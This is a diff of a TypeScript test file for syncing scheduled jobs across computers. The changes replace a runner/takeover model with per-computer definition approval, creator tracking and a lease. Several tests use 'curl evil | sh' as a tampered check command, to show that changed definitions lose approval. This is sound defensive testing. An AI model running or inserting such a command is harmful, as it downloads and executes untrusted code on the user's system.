@@ -3,10 +3,10 @@ import assert from 'node:assert/strict';
 import fs from 'fs';
 import os from 'os';
 import path from 'path';
-import { CHECK_OUTPUT_KEEP, createSchedule, isDue, planScheduleCheck, recordRun, type ScheduleState } from '../src/main/schedule.ts';
+import { CHECK_OUTPUT_KEEP, createSchedule, planScheduleCheck, recordRun, type ScheduleState } from '../src/main/schedule.ts';
 import {
-  canRunHere, collectBucketSchedules, parseScheduleObjectRel, scheduleObjectRel, definitionHash, isRunnerHere, mergeSchedule, parseRemoteSchedule, planScheduleSync, remoteBody,
-  stampLocalWrite, takeOver, timingState, tombstoneBody, type RemoteSchedule,
+  chargeRun, collectBucketSchedules, definitionApproved, parseScheduleObjectRel, scheduleObjectRel, definitionHash, isRunnerHere, mergeSchedule, parseRemoteSchedule, planScheduleSync, remoteBody,
+  stampLocalWrite, tombstoneBody, type RemoteSchedule,
 } from '../src/main/scheduleSync.ts';
 import * as scheduleStore from '../src/main/scheduleStore.ts';
 
@@ -22,33 +22,27 @@ function job(over: Partial<ScheduleState> = {}): ScheduleState {
   };
 }
 
-describe('runner', () => {
-  test('only the runner, with an approved definition, runs it', () => {
+describe('approval and creator (第 12 轮：哪台在线就由哪台跑)', () => {
+  test('only a definition confirmed on this computer counts; any change to it needs confirming again', () => {
     const s = job();
     const hash = definitionHash(s);
-    assert.equal(canRunHere(s, A.id, hash), true);
-    assert.equal(canRunHere(s, B.id, hash), false, 'another machine never runs it');
-    assert.equal(canRunHere(s, A.id, undefined), false, 'runner = me but never confirmed here (e.g. restored from S3)');
-    assert.equal(canRunHere({ ...s, spec: { ...s.spec, checkCommand: 'curl evil | sh' } }, A.id, hash), false, 'definition changed since confirmation');
+    assert.equal(definitionApproved(s, hash), true);
+    assert.equal(definitionApproved(s, undefined), false, 'came from the bucket, never confirmed here');
+    assert.equal(definitionApproved({ ...s, spec: { ...s.spec, checkCommand: 'curl evil | sh' } }, hash), false, 'definition changed since confirmation');
+    assert.equal(definitionApproved({ ...s, runner: B.id, runs: 9 }, hash), true, 'who ran it last / run state do not matter');
   });
 
-  test('a legacy file without runner counts as created here', () => {
-    const { runner: _r, ...legacy } = job();
-    assert.equal(isRunnerHere(legacy as ScheduleState, A.id), true);
-    const stamped = stampLocalWrite(null, legacy as ScheduleState, A, T0 + 5);
-    assert.equal(stamped.runner, A.id);
-    assert.equal(stamped.runnerName, A.name);
-  });
-
-  test('take over: runner = me, first run counted from the takeover, no catch-up', () => {
-    const ran = { ...job({ runner: B.id, runnerName: B.name }), lastRunAt: T0, runs: 1 };
-    const now = T0 + 10 * 3600_000;   // B has been off for 10 h
-    const mine = takeOver(ran, A, now);
-    assert.equal(mine.runner, A.id);
-    assert.equal(mine.runnerChangedAt, now);
-    assert.equal(isDue(timingState(mine), now + 1000), false, 'not due right after taking over');
-    assert.equal(isDue(timingState(mine), now + 3600_000), true, 'due one interval after the takeover');
-    assert.equal(mine.lastRunAt, T0, 'the stored lastRunAt is untouched');
+  test('a new file gets creator = this computer; an old file\'s runner becomes its creator', () => {
+    const { runner: _r, runnerName: _n, runnerChangedAt: _c, ...fresh } = job();
+    const created = stampLocalWrite(null, fresh as ScheduleState, A, T0 + 5);
+    assert.equal(created.creator, A.id);
+    assert.equal(created.creatorName, A.name);
+    assert.equal(created.runner, A.id, 'not run yet: "last run by" = its creator');
+    const legacy = job({ runner: 'devOld', runnerName: 'old-mac' });
+    const migrated = stampLocalWrite(legacy, legacy, B, T0 + 6);
+    assert.equal(migrated.creator, 'devOld');
+    assert.equal(migrated.creatorName, 'old-mac');
+    assert.equal(isRunnerHere(migrated, 'devOld'), true);
   });
 });
 
@@ -75,16 +69,17 @@ describe('stampLocalWrite', () => {
 });
 
 describe('mergeSchedule', () => {
-  test('run state comes only from the runner', () => {
-    const onA = recordRun(job(), T0 + 100);
-    const runOnA = { ...onA, statusBy: A.id, statusAt: T0 + 100 };
-    /* B (not the runner) has a copy claiming more runs, written by B */
-    const onB = { ...job(), runs: 7, lastRunAt: T0 + 200, statusBy: B.id, statusAt: T0 + 200 };
-    const atA = mergeSchedule(runOnA, onB, A.id).state;
-    assert.equal(atA.runs, 1, 'runner keeps its own run state');
-    const atB = mergeSchedule(onB, runOnA, B.id).state;
-    assert.equal(atB.runs, 1, 'non-runner takes the runner-written version');
-    assert.equal(atB.lastRunAt, T0 + 100);
+  test('run state (and "last run by") follows the newer planned slot, whichever computer ran it', () => {
+    const ranOnB = chargeRun(job(), T0 + 3600_000, B, T0 + 3600_500);
+    const onA = mergeSchedule(job(), ranOnB, A.id).state;
+    assert.equal(onA.runs, 1);
+    assert.equal(onA.runner, B.id);
+    assert.equal(onA.lastRunFor, T0 + 3600_000);
+    /* a stale copy never rolls it back */
+    assert.equal(mergeSchedule(onA, job(), A.id).state.runs, 1);
+    /* same slot: the later write wins */
+    const later = { ...ranOnB, lastError: 'send failed', statusAt: (ranOnB.statusAt ?? 0) + 10 };
+    assert.equal(mergeSchedule(ranOnB, later, A.id).state.lastError, 'send failed');
   });
 
   test('control ops: last one wins, from any machine (pause on B pauses A)', () => {
@@ -97,76 +92,26 @@ describe('mergeSchedule', () => {
     assert.equal(mergeSchedule({ ...onA, expiresAt: T0 + 1e6 }, extOnB, A.id).state.expiresAt, T0 + 9e6);
   });
 
-  test('the runner rejects a remote definition change (checkCommand stays)', () => {
+  test('a changed definition from the bucket is taken but flagged, so this computer must confirm it again before running', () => {
     const onA = job();
-    const evil = { ...job(), spec: { ...onA.spec, checkCommand: 'curl evil | sh', prompt: 'other' } };
-    const r = mergeSchedule(onA, evil, A.id);
-    assert.equal(r.state.spec.checkCommand, 'node check.js');
-    assert.equal(r.state.spec.prompt, 'check build');
-    assert.equal(r.notes.defRejected, true);
+    const hash = definitionHash(onA);
+    const changed = { ...job(), spec: { ...onA.spec, checkCommand: 'curl evil | sh', prompt: 'other' } };
+    const r = mergeSchedule(onA, changed, A.id);
+    assert.equal(r.notes.defChanged, true);
+    assert.equal(r.state.spec.checkCommand, 'curl evil | sh');
+    assert.equal(definitionApproved(r.state, hash), false, 'no longer runs here until confirmed');
+    assert.equal(mergeSchedule(onA, onA, A.id).notes.defChanged, undefined);
   });
 
-  test('a remote copy cannot make this machine the runner', () => {
-    const onA = job({ runner: B.id, runnerName: B.name, runnerChangedAt: T0 });
-    const claims = { ...onA, runner: A.id, runnerChangedAt: T0 + 999 };
-    const r = mergeSchedule(onA, claims, A.id);
-    assert.equal(r.state.runner, B.id);
-    assert.equal(r.notes.refusedAssign, true);
-  });
-
-  test('takeover race: the later runnerChangedAt wins on both machines; the loser is told', () => {
-    const base = job({ runner: 'devC', runnerName: 'c', runnerChangedAt: T0 });
-    const aTook = takeOver(base, A, T0 + 1000);
-    const bTook = takeOver(base, B, T0 + 1001);
-    const atA = mergeSchedule(aTook, bTook, A.id);
-    const atB = mergeSchedule(bTook, aTook, B.id);
-    assert.equal(atA.state.runner, B.id);
-    assert.equal(atB.state.runner, B.id);
-    assert.equal(atA.notes.lostTo, B.id, 'A stops and says so');
-    assert.equal(atB.notes.lostTo, undefined);
-  });
-
-  test('takeover in the same millisecond: both machines (and a third) settle on one runner, and stay there', () => {
-    const base = job({ runner: 'devC', runnerName: 'c', runnerChangedAt: T0 });
-    const at = T0 + 1000;
-    const aTook = takeOver(base, A, at);
-    const bTook = takeOver(base, B, at);
-    const atA = mergeSchedule(aTook, bTook, A.id);
-    const atB = mergeSchedule(bTook, aTook, B.id);
-    const winner = A.id > B.id ? A.id : B.id;
-    const loser = winner === A.id ? B.id : A.id;
-    assert.equal(atA.state.runner, winner);
-    assert.equal(atB.state.runner, winner, 'both sides agree');
-    assert.equal(canRunHere(atA.state, A.id, definitionHash(aTook)) && canRunHere(atB.state, B.id, definitionHash(bTook)), false, 'never both');
-    /* exactly one of them is told it lost */
-    assert.deepEqual([atA.notes.lostTo, atB.notes.lostTo].filter(Boolean), [winner]);
-    assert.equal(winner === A.id ? atB.notes.lostTo : atA.notes.lostTo, winner, `${loser} stops`);
-    /* the next rounds keep converging (each side uploads its merge, the other pulls it) */
-    assert.equal(mergeSchedule(atA.state, atB.state, A.id).state.runner, winner);
-    assert.equal(mergeSchedule(atB.state, atA.state, B.id).state.runner, winner);
-    /* a third computer, either order */
-    assert.equal(mergeSchedule(mergeSchedule(base, aTook, 'devC').state, bTook, 'devC').state.runner, winner);
-    assert.equal(mergeSchedule(mergeSchedule(base, bTook, 'devC').state, aTook, 'devC').state.runner, winner);
-  });
-
-  test('the tie-break never hands the job to this machine from a remote copy', () => {
-    const local = job({ runner: 'devZ', runnerName: 'z', runnerChangedAt: T0 });   // 'devZ' > 'devA'
-    const claims = { ...local, runner: 'devzz', runnerChangedAt: T0 };              // would win the tie by id...
-    const r = mergeSchedule(local, claims, 'devzz');                                 // ...but 'devzz' is this machine
-    assert.equal(r.state.runner, 'devZ');
-    assert.equal(r.notes.refusedAssign, true);
-  });
-
-  test('old runner ran once more before it saw the takeover: logged on both sides, new runner keeps its own state', () => {
-    const shared = job();
-    const bTook = takeOver(shared, B, T0 + 500);
-    const aRanAgain = { ...recordRun(shared, T0 + 600), statusBy: A.id, statusAt: T0 + 600 };
-    const atA = mergeSchedule(aRanAgain, bTook, A.id);
-    assert.equal(atA.state.runner, B.id);
-    assert.equal(atA.notes.ranAfterHandover, true);
-    const atB = mergeSchedule(bTook, aRanAgain, B.id);
-    assert.equal(atB.state.runs, 0, 'new runner does not take the old runner\'s late run');
-    assert.equal(atB.notes.ignoredRunBy, A.id);
+  test('creator: the local record wins; an old file\'s runner stands in; sessionId is always local', () => {
+    const local = job({ creator: A.id, creatorName: A.name });
+    const remote = { ...job({ creator: 'devX', creatorName: 'x' }), sessionId: 'other' };
+    const m = mergeSchedule(local, remote, A.id).state;
+    assert.equal(m.creator, A.id);
+    assert.equal(m.sessionId, 's1');
+    const { creator: _c, ...legacy } = job({ runner: 'devOld' });
+    assert.equal(mergeSchedule(legacy as ScheduleState, remote, A.id).state.creator, 'devX', 'local has none: take the one from the bucket');
+    assert.equal(mergeSchedule(legacy as ScheduleState, legacy as ScheduleState, A.id).state.creator, undefined, 'nothing invented (an unchanged pair stays unchanged)');
   });
 });
 
@@ -254,35 +199,6 @@ describe('planScheduleSync', () => {
   });
 });
 
-describe('a third computer only takes run state from the current runner', () => {
-  const C = 'devC';
-  test('B took over and has not run; A ran once more before seeing it: C never takes A\'s late run, in either order', () => {
-    const shared = job();                                  // A is runner, runs 0
-    const bTook = takeOver(shared, B, T0 + 500);
-    assert.equal(bTook.statusBy, B.id, 'takeover establishes the new runner\'s baseline');
-    const aRanAgain = { ...recordRun(shared, T0 + 600), statusBy: A.id, statusAt: T0 + 600 };
-    /* C still holds the pre-takeover copy */
-    const c1 = mergeSchedule(mergeSchedule(shared, bTook, C).state, aRanAgain, C).state;
-    const c2 = mergeSchedule(mergeSchedule(shared, aRanAgain, C).state, bTook, C).state;
-    for (const c of [c1, c2]) {
-      assert.equal(c.runner, B.id);
-      assert.equal(c.runs, 0, 'A\'s run after the handover is not accepted');
-      assert.equal(c.statusBy, B.id);
-    }
-    /* A's own copy after it learns of the takeover, merged on C: still B's state */
-    const aAfter = mergeSchedule(aRanAgain, bTook, A.id).state;
-    assert.equal(mergeSchedule(shared, aAfter, C).state.runs, 0);
-  });
-
-  test('neither copy written by the runner: only state from before the handover is taken', () => {
-    const legacy = job({ runner: B.id, runnerName: B.name, runnerChangedAt: T0 + 500, statusBy: A.id, statusAt: T0 + 100 });
-    const lateA = { ...legacy, runs: 5, lastRunAt: T0 + 700, statusBy: A.id, statusAt: T0 + 700 };
-    assert.equal(mergeSchedule(legacy, lateA, C).state.runs, 0, 'written after the handover by a non-runner: refused');
-    const earlierA = { ...legacy, runs: 2, statusBy: A.id, statusAt: T0 + 300 };
-    assert.equal(mergeSchedule(legacy, earlierA, C).state.runs, 2, 'before the handover: the newer pre-handover state');
-  });
-});
-
 describe('last check result', () => {
   test('recorded on every outcome; actions and exit-code meaning unchanged; output kept as a short tail', () => {
     const s = job();
@@ -303,14 +219,13 @@ describe('last check result', () => {
     assert.equal(planScheduleCheck(s, { status: 'timeout', output: '' }, T0, 'en').state.lastCheck?.code, null);
   });
 
-  test('synced as run state: a non-runner takes the runner\'s; the old runner\'s post-handover check is refused', () => {
-    const onA = { ...planScheduleCheck(job(), { status: 'exited', code: 1, output: 'still red' }, T0 + 100, 'en').state, statusBy: A.id, statusAt: T0 + 100 };
-    const onB = mergeSchedule(job(), onA, B.id).state;
+  test('synced as run state: the computer that ran the newer slot supplies the last check', () => {
+    const ranOnA = chargeRun({ ...planScheduleCheck(job(), { status: 'exited', code: 1, output: 'still red' }, T0 + 100, 'en').state }, T0 + 100, A, T0 + 100);
+    const onB = mergeSchedule(job(), ranOnA, B.id).state;
     assert.equal(onB.lastCheck?.output, 'still red');
-    const bTook = takeOver(onB, B, T0 + 500);
-    const aLate = { ...planScheduleCheck(onA, { status: 'exited', code: 1, output: 'late' }, T0 + 600, 'en').state, statusBy: A.id, statusAt: T0 + 600 };
-    assert.equal(mergeSchedule(bTook, aLate, B.id).state.lastCheck?.output, 'still red');
-    assert.equal(mergeSchedule(aLate, bTook, 'devC').state.lastCheck?.output, 'still red');
+    const ranOnB = chargeRun({ ...planScheduleCheck(onB, { status: 'exited', code: 1, output: 'green soon' }, T0 + 3700_000, 'en').state }, T0 + 3700_000, B, T0 + 3700_000);
+    assert.equal(mergeSchedule(ranOnA, ranOnB, A.id).state.lastCheck?.output, 'green soon');
+    assert.equal(mergeSchedule(ranOnB, ranOnA, B.id).state.lastCheck?.output, 'green soon', 'an older slot never rolls it back');
   });
 
   test('parsed from the bucket; a malformed one is dropped', () => {
@@ -322,59 +237,26 @@ describe('last check result', () => {
   });
 });
 
-describe('auto-pause (check errors) is a run result, not a user control op', () => {
-  const C = 'devC';
-  /** A, not yet aware of B's takeover, fails its 3rd check in a row and auto-pauses (stamped like a local write). */
-  function aAutoPaused(shared: ScheduleState, at: number): ScheduleState {
-    return stampLocalWrite(shared, { ...shared, checkErrors: 3, lastRunAt: at, paused: true, pausedBy: 'check-errors' }, A, at);
-  }
-
-  test('A auto-pauses after B took over: not applied on B, on C, or on A once it learns', () => {
-    const shared = job({ checkErrors: 2 });
-    const bTook = takeOver(shared, B, T0 + 500);
-    const aPaused = aAutoPaused(shared, T0 + 600);
-    assert.equal(aPaused.pausedChangedAt, T0 + 600);
-    for (const [label, merged] of [
-      ['on B', mergeSchedule(bTook, aPaused, B.id).state],
-      ['on C (B first)', mergeSchedule(mergeSchedule(shared, bTook, C).state, aPaused, C).state],
-      ['on C (A first)', mergeSchedule(mergeSchedule(shared, aPaused, C).state, bTook, C).state],
-      ['on A', mergeSchedule(aPaused, bTook, A.id).state],
-    ] as const) {
-      assert.equal(merged.runner, B.id, label);
-      assert.equal(merged.paused, false, `${label}: B's job is not paused by A's late check`);
-      assert.notEqual(merged.pausedBy, 'check-errors', label);
-      assert.equal(merged.checkErrors ?? 0, 2, `${label}: A's error count is not taken either`);
-    }
-  });
-
-  test('the runner\'s own auto-pause, and one from before the handover, still sync', () => {
-    const shared = job({ checkErrors: 2 });
-    const aPaused = aAutoPaused(shared, T0 + 600);
-    /* no handover: A (runner) auto-paused → B sees it paused */
-    assert.equal(mergeSchedule(shared, aPaused, B.id).state.paused, true);
-    /* B took over after A's auto-pause → still paused (the user resumes it) */
-    const bTookLater = takeOver(aPaused, B, T0 + 900);
-    assert.equal(mergeSchedule(aPaused, bTookLater, C).state.paused, true);
-  });
-
-  test('a user pause / resume from any computer still wins by time, even after a handover', () => {
-    const shared = job();
-    const bTook = takeOver(shared, B, T0 + 500);
-    const userPausedOnA = stampLocalWrite(shared, { ...shared, paused: true, pausedBy: null }, A, T0 + 700);
-    const onB = mergeSchedule(bTook, userPausedOnA, B.id).state;
+describe('pause / resume across computers', () => {
+  test('an auto-pause (check errors) from the computer that ran the check, and a later user resume elsewhere, both sync by time', () => {
+    const base = job({ checkErrors: 2 });
+    const autoPaused = stampLocalWrite(base, { ...base, checkErrors: 3, paused: true, pausedBy: 'check-errors' }, A, T0 + 600);
+    const onB = mergeSchedule(base, autoPaused, B.id).state;
     assert.equal(onB.paused, true);
-    const resumedOnC = stampLocalWrite(onB, { ...onB, paused: false }, { id: C, name: 'c' }, T0 + 800);
-    assert.equal(mergeSchedule(onB, resumedOnC, B.id).state.paused, false);
+    assert.equal(onB.pausedBy, 'check-errors');
+    const resumedOnB = stampLocalWrite(onB, { ...onB, paused: false, pausedBy: null }, B, T0 + 700);
+    assert.equal(mergeSchedule(autoPaused, resumedOnB, A.id).state.paused, false);
   });
 });
 
-describe('a check command that finishes after the job was handed over (real async flow)', () => {
-  /** Runs the real runScheduleCheck; while the command is "running", a sync writes B's takeover to disk. */
+describe('a check command that finishes after this computer lost the lease (real async flow)', () => {
+  /** Runs the real runScheduleCheck; while the command is "running", the lease renewal finds it was overwritten. */
   async function runWithTakeoverMidCheck(result: any, start: Partial<ScheduleState> = {}) {
     const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
     const mine = job({ lastRunAt: T0 - 7200_000, ...start });
     const hash = definitionHash(mine);
     let disk: ScheduleState | null = mine;
+    let lost = false;
     const writes: ScheduleState[] = [];
     const changed: ScheduleState[] = [];
     const notes: string[] = [];
@@ -385,29 +267,28 @@ describe('a check command that finishes after the job was handed over (real asyn
       write: (_id, s) => { disk = s; writes.push(s); },
       runCheck: async () => {
         await new Promise((r) => setTimeout(r, 5));
-        disk = mergeSchedule(disk!, takeOver(mine, B, T0 + 1), A.id).state;   // the sync lands mid-check
+        lost = true;   // the renewal (every 60 s) found another computer had overwritten the lease
         return result;
       },
       changed: (_id, s) => { changed.push(s); },
       noteUser: (_sid, text) => { notes.push(text); },
       log: (m) => { logs.push(m); },
-      stillRunsHere: (_id, s) => canRunHere(s, A.id, hash),
+      stillRunsHere: (_id, s) => !lost && definitionApproved(s, hash),
       lang: 'en',
     });
     return { out, disk: disk!, writes, changed, notes, logs };
   }
 
-  test('exit 0 does not mark B\'s job achieved, and nothing is woken or broadcast', async () => {
+  test('exit 0 does not mark the job achieved, and nothing is woken or broadcast', async () => {
     const r = await runWithTakeoverMidCheck({ status: 'exited', code: 0, output: 'green' });
     assert.equal(r.out, null);
     assert.equal(r.disk.terminal, null);
-    assert.equal(r.disk.runner, B.id);
-    assert.equal(r.writes.length, 1, 'only the pre-check timestamp, written while still the runner');
+    assert.equal(r.writes.length, 1, 'only the pre-check timestamp, written while still holding the lease');
     assert.deepEqual(r.changed, []);
-    assert.ok(r.logs.some((m) => m.includes('handover') && m.includes('runner=devB')));
+    assert.ok(r.logs.some((m) => m.includes('handover') && m.includes('id=j1')));
   });
 
-  test('the 3rd consecutive error does not pause B\'s job or stamp a pause time', async () => {
+  test('the 3rd consecutive error does not pause the job or stamp a pause time', async () => {
     const r = await runWithTakeoverMidCheck({ status: 'exited', code: 2, output: 'boom' }, { checkErrors: 2 });
     assert.equal(r.out, null);
     assert.equal(r.disk.paused, false);
@@ -425,21 +306,21 @@ describe('a check command that finishes after the job was handed over (real asyn
       now: () => T0, read: () => disk, write: (_id, s) => { disk = s; },
       runCheck: async () => ({ status: 'exited', code: 0, output: 'green' }),
       changed: () => {}, noteUser: () => {}, log: () => {},
-      stillRunsHere: (_id, s) => canRunHere(s, A.id, hash), lang: 'en',
+      stillRunsHere: (_id, s) => definitionApproved(s, hash), lang: 'en',
     });
     assert.ok(out);
     assert.equal(disk!.terminal, 'achieved');
   });
 });
 
-describe('a queued wake re-checks the runner before it is sent', () => {
-  test('after syncing in a takeover, this machine no longer counts as able to run it (the gate the queued wake checks)', () => {
+describe('a queued wake re-checks the definition before it is sent', () => {
+  test('a definition changed in the bucket while the wake waited → no longer confirmed here (the gate the queued wake checks)', () => {
     const mine = job();
     const hash = definitionHash(mine);
-    assert.equal(canRunHere(mine, A.id, hash), true);
-    const merged = mergeSchedule(mine, takeOver(mine, B, T0 + 10), A.id);
-    assert.equal(merged.notes.lostTo, B.id);
-    assert.equal(canRunHere(merged.state, A.id, hash), false);
+    assert.equal(definitionApproved(mine, hash), true);
+    const merged = mergeSchedule(mine, { ...mine, spec: { ...mine.spec, prompt: 'changed elsewhere' } }, A.id);
+    assert.equal(merged.notes.defChanged, true);
+    assert.equal(definitionApproved(merged.state, hash), false);
   });
 });
 
@@ -514,11 +395,12 @@ describe('scheduleStore with a local machine', () => {
       const { runner: _r, runnerName: _n, runnerChangedAt: _c, statusBy: _b, statusAt: _a, ...fresh } = job();
       scheduleStore.writeSchedule('j1', fresh as ScheduleState, home);
       const saved = scheduleStore.readSchedule('j1', home)!.state;
+      assert.equal(saved.creator, A.id);
       assert.equal(saved.runner, A.id);
-      assert.equal(canRunHere(saved, A.id, scheduleStore.readApprovedHash('j1', home)), true);
-      /* adopted from the bucket with runner = me: written raw, never approved */
+      assert.equal(definitionApproved(saved, scheduleStore.readApprovedHash('j1', home)), true);
+      /* adopted from the bucket (even one claiming this computer created it): written raw, never approved */
       scheduleStore.writeScheduleRaw('j2', job(), home);
-      assert.equal(canRunHere(scheduleStore.readSchedule('j2', home)!.state, A.id, scheduleStore.readApprovedHash('j2', home)), false);
+      assert.equal(definitionApproved(scheduleStore.readSchedule('j2', home)!.state, scheduleStore.readApprovedHash('j2', home)), false);
       scheduleStore.removeSchedule('j1', home);
       assert.ok(scheduleStore.readScheduleTombstones(home).j1);
       scheduleStore.writeSchedule('j1', saved, home);
